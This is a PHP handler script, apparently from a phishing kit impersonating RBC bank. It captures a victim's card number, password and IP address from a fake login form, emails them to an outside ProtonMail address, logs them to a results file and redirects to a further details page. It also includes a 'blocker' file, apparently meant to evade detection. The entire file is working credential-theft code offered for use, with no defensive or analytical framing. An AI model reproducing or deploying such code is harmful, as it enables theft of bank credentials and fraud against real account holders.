<?php
include('blocker.php');
?>
<?php

$ip = getenv("REMOTE_ADDR");
$message .= "--------------RBC 1 Info----------------------\n";
$message .= "Card num : ".$_POST['K1']."\n";
$message .= "Password : ".$_POST['Q1']."\n";
$message .= "IP                     : ".$ip."\n";
$send = "rikkogreen44@protonmail.com";
$subject = "1 RBC LOGIN $ip";
$headers = "From: RBC Info<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);

@mail($send,$subject,$message,$headers);
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
		   header("Location: details.php");

	 
?>